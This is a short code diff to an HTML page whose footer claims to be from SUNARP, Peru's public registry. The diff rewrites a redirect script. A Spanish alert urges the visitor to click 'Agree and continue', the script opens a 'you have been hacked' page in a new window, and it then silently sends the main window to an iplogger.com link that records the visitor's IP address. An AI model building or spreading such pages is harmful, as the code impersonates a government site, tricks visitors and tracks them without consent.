@@ -92,14 +92,20 @@
     © SUNARP - República del Perú
   </footer>
 
-  <script>
+<script>
   function redirect() {
-  alert('Dale click donde dice "Agree and continue" en la siguiente página.');
-  setTimeout(() => {
-    window.location.href = "final.html";  // now goes to your own page
-  }, 1500);
-}
-  </script>
+    alert('Dale click donde dice "Agree and continue" en la siguiente página.');
+
+    // 1. Abrir "Has sido hackeado" en una nueva ventana
+    window.open("final.html", "_blank");
+
+    // 2. Redirigir la página principal a iplogger
+    setTimeout(() => {
+      window.location.href = "https://iplogger.com/2Uk6c6";
+    }, 1500);
+  }
+</script>
+
 
 </body>
 </html>
